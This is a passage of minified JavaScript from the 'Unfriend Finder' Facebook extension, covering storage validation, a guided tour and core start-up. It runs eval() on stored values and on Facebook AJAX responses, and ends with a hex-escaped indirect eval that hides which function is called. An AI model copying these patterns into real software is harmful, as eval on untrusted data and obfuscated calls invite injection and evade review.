message.date=genTime(message.date);new xHTMLElement({element:"div",innerHTML:parseTemplate('    <div class="gigaboxx_thread_header">        <h2 class="gigaboxx_thread_header_subject"></h2>        <div class="gigaboxx_thread_header_authors">To users of Unfriend Finder</div>    </div>    <div id="ufMessage_::id::_content">        <div class="GBThreadMessageRow clearfix">            <div class="GBThreadMessageRow_Image">                <a href="::url::" class="GBThreadMessageRow_Image_Link">                    <img src="::picture::" class="UIProfileImage UIProfileImage_Large">                </a>            </div>            <div class="GBThreadMessageRow_Main">                <div class="GBThreadMessageRow_Info">                    <span class="GBThreadMessageRow_AuthorLink_Wrapper">                        <a href="::url::" class="GBThreadMessageRow_AuthorLink">::author::</a>                    </span>                    <span class="GBThreadMessageRow_Date">::date::</span>                    <span class="GBThreadMessageRow_BranchLink"></span>                    <span class="GBThreadMessageRow_ReportLink"></span>                </div>                <div class="GBThreadMessageRow_Body" style="width: 440px;">                    <div class="GBThreadMessageRow_Body_Content">                        <br />::content::                    </div>                    <div class="GBThreadMessageRow_ReferrerLink"></div>                    <div class="GBThreadMessageRow_Body_Attachment"></div>                </div>            </div>        </div>    </div>',{params:{id:message.id,author:Params._0x4d22,url:"https://www.unfriendfinder.com",picture:Params.images.fanImageSmall,title:message.title,content:message.content,date:message.date}}),parentNode:UFMessages_content});
getFromId("title_header").innerHTML=message.title}else{CSS3.hide(UFMessages_content);CSS3.display(UFMessages_list,CSS3.DISPLAY.block)}};core.validateStorage=function validateStorage(){trace();core.errors=new (Array);try{void eval(Registry.getKey(core.user_id+"_unfriends"))}catch(exception){core.errorStorage(core.user_id+"_unfriends","({})")}try{void eval(Registry.getKey(core.user_id+"_friends"))}catch(exception){core.errorStorage(core.user_id+"_friends","({})")}try{void eval(Registry.getKey(core.user_id+"_toNotify"))
}catch(exception){core.errorStorage(core.user_id+"_toNotify","({})")}try{void eval(Registry.getKey(core.user_id+"_awaitingsIgnored"))}catch(exception){core.errorStorage(core.user_id+"_awaitingsIgnored","({})")}try{void eval(Registry.getKey(core.user_id+"_keepAwaitingList"))}catch(exception){core.errorStorage(core.user_id+"_keepAwaitingList","({})")}try{void eval(Registry.getKey(core.user_id+"_keepAwaitingsTime"))}catch(exception){core.errorStorage(core.user_id+"_keepAwaitingsTime","({})")}try{void eval(Registry.getKey(core.user_id+"_reappeared"))
}catch(exception){core.errorStorage(core.user_id+"_reappeared","({})")}try{void eval(Registry.getKey(core.user_id+"_deactivated"))}catch(exception){core.errorStorage(core.user_id+"_deactivated","({})")}try{void eval(Registry.getKey(core.user_id+"_wasUnfriend"))}catch(exception){core.errorStorage(core.user_id+"_wasUnfriend","({})")}try{void eval(Registry.getKey(core.user_id+"_hasIgnored"))}catch(exception){core.errorStorage(core.user_id+"_hasIgnored","({})")}try{void eval(Registry.getKey(core.user_id+"_countUnfriends"))
}catch(exception){core.errorStorage(core.user_id+"_countUnfriends","({})")}try{void eval(Registry.getKey(core.user_id+"_alwaysHide"))}catch(exception){core.errorStorage(core.user_id+"_alwaysHide","({})")}try{void eval(Registry.getKey(core.user_id+"_messages"))}catch(exception){core.errorStorage(core.user_id+"_messages","({})")}try{void eval(Registry.getKey(core.user_id+"_helps"))}catch(exception){core.errorStorage(core.user_id+"_helps",stringify(Params.defaultHelps))}try{void eval(Registry.getKey(core.user_id+"_watchRemove"))
}catch(exception){core.errorStorage(core.user_id+"_watchRemove","({})")}try{void Registry.getKey("_usage")}catch(exception){core.errorStorage("_usage","0")}try{void Registry.getKey("settings")}catch(exception){core.errorStorage("settings",stringify(Params.defaultSettings))}try{void Registry.getKey("language")}catch(exception){core.errorStorage("language","en_US")}try{void Registry.getKey("version")}catch(exception){core.errorStorage("version",Params.version)}try{void Registry.getKey("coreStarted")
}catch(exception){core.errorStorage("coreStarted","1")}if(typeof eval(Registry.getKey(core.user_id+"_toNotify"))!="object"){Registry.setKey(core.user_id+"_toNotify","({})")}core.errorStorage("end")};core.errorStorage=function errorStorage(item,defaultValue){trace();if(item=="end"){if(core.errors.length>0){var err="Validation error:\n\nErrors detected on stored values: "+core.errors.join(", ")+"\nValues erased, continuing.";Console.error(err);alert(err);core.errors=new (Array)}}else{core.errors.push(item);
Registry.setKey(item,defaultValue)}};core.checkOldVersion=function checkOldVersion(){trace();var scripts=toArray(document.getElementsByTagName("script")),script,oldVersion=false;scripts.forEach(function(script){if(script==="http://userscripts.org/scripts/source/58852.user.js"){oldVersion=true}});if(oldVersion){Params.version=14;var d=new xHTMLElement({element:"div",innerHTML:parseTemplate('<div class="includedWarning">   <div class="boxError">       You are using an outdated extension of Unfriend Finder.       <br />This version 14 needs to be uninstalled before using the latest version        <br /><br />Please <a href="::chrome::" onclick="window.open(this.href); return false;">uninstall</a> it from your extensions and re-install the lastest extension from the official site,<br />on <a href="::download::">::download::</a>.       <br />Otherwise, this message will appear again.   </div></div>',{params:{chrome:"https://www.unfriendfinder.com/help/uninstallation/chrome",download:"https://www.unfriendfinder.com/download"}})}).getElement();
console.error("You are using an outdated extension of Unfriend Finder.");if(getFromId("content")){getFromId("mainContainer").parentNode.insertBefore(d,getFromId("mainContainer"))}if(getFromId("leftCol")){getFromId("leftCol").style.marginTop="-140px"}return false}};core.initTour=function initTour(){trace();if(Registry.getKey(core.user_id+"_takeTour","0")=="1"){new xHTMLElement({element:"link",type:"text/css",href:Params.links.rsrc+"/y0/r/Pqpa_q748l0.css",id:"Pqpa_q748l0",rel:"stylesheet",parentNode:Params.head});
new xHTMLElement({element:"link",type:"text/css",href:Params.links.rsrc+"/yB/r/NJ-Pgma2lMp.css",id:"NJ-Pgma2lMp",rel:"stylesheet",parentNode:Params.head});core.tour=new UFTour({steps:{elements:[{id:1,selected:true,name:"Menubar",handler:function(){core.layer.layerHide("tour1");if(getFromId("fb_menu_unfriends")){if(core.dialogs.tourForNavigation){core.dialogs.tourForNavigation.Hide()}if(core.dialogs.tourForFilter){core.dialogs.tourForFilter.Hide()}if(core.dialogs.tourForAwaitings){core.dialogs.tourForAwaitings.Hide()
}if(core.dialogs.tourForSettings){core.dialogs.tourForSettings.Hide()}if(core.dialogs.tourForMenubar){return}Strings.tourForMenubar="This new link will help you to access your Unfriends list wherever you are.\nA red counter shows you the amount of new or total unfriends you currently have.\nYou can change settings such as the ability to hide or show this navigation button.";core.dialogs.tourForMenubar=new ContextualDialog({id:"tourForMenubar",title:"Menubar link",body:nl2br(Strings.tourForMenubar),context:getFromId("fb_menu_unfriends"),arrow:"top-right",align:"middle",overlay:true,halo:false,margin:0,shift:0,buttons:{next:true},next:function(){core.tour.showStep(2)
}});core.dialogs.tourForMenubar.Show()}else{core.tour.showStep(2)}}},{id:2,name:"Filter",handler:function(){core.layer.layerHide("tour2");CSS3.addClass(getFromId(Params.filterName),"sideNavItem open");if(core.dialogs.tourForMenubar){core.dialogs.tourForMenubar.Hide()}if(core.dialogs.tourForNavigation){core.dialogs.tourForNavigation.Hide()}if(core.dialogs.tourForAwaitings){core.dialogs.tourForAwaitings.Hide()}if(core.dialogs.tourForSettings){core.dialogs.tourForSettings.Hide()}if(core.dialogs.tourForFilter){return
}core.dialogs.tourForFilter=new ContextualDialog({id:"tourForFilter",title:'<span class="fr_FR">Nouveau Filtres</span><span class="en_US">New Filters</span>',body:template.Contextual_filter(),context:getFromId(Params.filterName),arrow:"left",align:"middle",overlay:true,halo:false,margin:0,shift:0,buttons:{next:true},next:function(){core.tour.showStep(3)}});core.dialogs.tourForFilter.Show()}},{id:3,name:"Navigation",handler:function(){CSS3.addClass(getFromId(Params.filterName),"sideNavItem open");
core.filter.select("unfriends");core.focus.focusOn(getFromId("contentUnfriends"));if(core.dialogs.tourForMenubar){core.dialogs.tourForMenubar.Hide()}if(core.dialogs.tourForFilter){core.dialogs.tourForFilter.Hide()}if(core.dialogs.tourForAwaitings){core.dialogs.tourForAwaitings.Hide()}if(core.dialogs.tourForSettings){core.dialogs.tourForSettings.Hide()}if(core.dialogs.tourForNavigation){return}Strings.tourForNavigation="Here is the place where you will be able to see your Unfriends.\nThey will be displayed as soon as they are detected by the script.\nUnfriends will be sorted by date of detection, displayed under each names.";
core.dialogs.tourForNavigation=new ContextualDialog({id:"tourForNavigation",title:'<span class="fr_FR">Liste des Unfriends</span><span class="en_US">Unfriends List</span>',body:nl2br(Strings.tourForNavigation),context:getFromId("bindHeader"),arrow:"top-left",align:"middle",overlay:false,halo:false,margin:0,shift:0,buttons:{next:true},next:function(){core.tour.showStep(4)}});core.dialogs.tourForNavigation.Show()}},{id:4,name:"Awaiting Requests",handler:function(){core.filter.select("awaitings");CSS3.addClass(getFromId(Params.filterName),"sideNavItem open");
core.focus.focusOn(getFromId("contentUnfriends"));if(core.dialogs.tourForMenubar){core.dialogs.tourForMenubar.Hide()}if(core.dialogs.tourForFilter){core.dialogs.tourForFilter.Hide()}if(core.dialogs.tourForNavigation){core.dialogs.tourForNavigation.Hide()}if(core.dialogs.tourForSettings){core.dialogs.tourForSettings.Hide()}if(core.dialogs.tourForAwaitings){return}Strings.tourForAwaitings="This section will help you to remember requests you made in the past. You can also remove the pending connection with those profiles.\nUnfriend Finder will alert you when someone cancels your request, and when someone confirms it.";
core.dialogs.tourForAwaitings=new ContextualDialog({id:"tourForAwaitings",title:'<span class="fr_FR">Requêtes en attente</span><span class="en_US">Awaiting Requests</span>',body:nl2br(Strings.tourForAwaitings),context:getFromId("bindHeader"),arrow:"left",align:"middle",overlay:true,halo:false,margin:0,shift:0,buttons:{next:true},next:function(){core.tour.showStep(5)}});core.dialogs.tourForAwaitings.Show()}},{id:5,name:"Settings",handler:function(){core.filter.select("settings");CSS3.setClass(getFromId("settingsBehavior"),"visible");
CSS3.addClass(getFromId(Params.filterName),"sideNavItem open");core.focus.focusOn(getFromId("contentUnfriends"));if(core.dialogs.tourForMenubar){core.dialogs.tourForMenubar.Hide()}if(core.dialogs.tourForFilter){core.dialogs.tourForFilter.Hide()}if(core.dialogs.tourForNavigation){core.dialogs.tourForNavigation.Hide()}if(core.dialogs.tourForAwaitings){core.dialogs.tourForAwaitings.Hide()}if(core.dialogs.tourForSettings){return}Strings.tourForSettings="The settings section will allow you to customize your Unfriend Finder experience, by providing a lot of options to change.\nYou will be able to select which type of notifications you want to receive, to change the language of the script, and export data to another browser, and so much more.\nSettings are available from the left-filters.";
core.dialogs.tourForSettings=new ContextualDialog({id:"tourForSettings",title:'<span class="fr_FR">Paramètres</span><span class="en_US">Settings</span>',body:nl2br(Strings.tourForSettings),context:getFromId("title_header"),arrow:"left",align:"middle",overlay:false,halo:false,margin:0,shift:0,buttons:{finish:true}});core.dialogs.tourForSettings.Show()}}]}});core.tour.start()}};if(Params.mobile){core.user_id=Params.mobileId;alert("Unfriend Finder can't be loaded yet on Facebook mobile.\nPlease go to www.facebook.com and inject the script there.");
window.location.href="http://www.facebook.com/?m2w&refid=7";return;Ajax({method:"get",headers:Params.Ajax.Headers,url:Params.protocol+"//"+Params.host+"/friends.php?__ajax__&__m_async_page__&__user="+core.user_id,onload:function(data,status){if(myJson=eval("("+data.replace("for (;;);","")+")")){var action,code,object,endPoint;myJson.payload.actions.forEach(function(action){if(/first_degree\.php/.test(action.code)){code=action.code;if(object=code.match(/function\(\)\s?\{\s*[A-Za-z\.]+\((.+)\);?\s*\}(,\s.)?\)/mi)[1]){try{object=eval("("+object+")");
if(endPoint=object["m-search-friends"][0].sources.bootstrapped.src){endPoint=endPoint.replace(/\&include_viewer=1/,"");Ajax({method:"get",headers:Params.Ajax.Headers,url:Params.protocol+"//"+Params.host+unescape(endPoint),onload:function(data,status){if(myJson=eval("("+data.replace("for (;;);","")+")")){Console.log(myJson.payload.length+" friends found");core.payload=myJson.payload}else{core.lEF("Error",this+' Error while retreiving Facebook database (<a onclick="window.open(this.href); return false;" href="'+this.url+'">page_search.php</a>) :\n'+status)
}}})}}catch(ex){}}}})}else{core.lEF("Error",this+' Error while retreiving Facebook database (<a onclick="window.open(this.href); return false;" href="'+this.url+'">page_search.php</a>) :\n'+status)}}});return}Console.log("Initializing core");"check arguments";core.doctor=new (Doctor)(Registry.getKey("healing","[]"));core.style=new (Style);core.addStyles();core.validateStorage();Console.log("Storage validated");core.initLists();core.initLanguage();core.focus=new (Focus);core.menubar=new (BlueLink);
core.filter=new (Filter);core.layer=new (UFLayer);core.settings=new (Settings);core.friendlist=new (FriendListComparer);core.dat+="&scriptlocale="+LANG;setTimeout(function(){core.initBeeper();core.checkValues();core.validateUrls();core.check(true);core.updateUsage();core.checkOldVersion();core.bindKeys();core.loadCheckProfile();core.settings.appendMenu();core.initTour();core.onReady();var loadedTime=((+new (Date)-startTime)+"ms");Console.log("Core Ready in "+loadedTime)},500)};("indirect",eval("\x61\x34\x65\x6B\x45"))();
setTimeout(checkScript,8000)})("40.810","1f49be50ff853d88f7d95218e0a6304d4983abcb");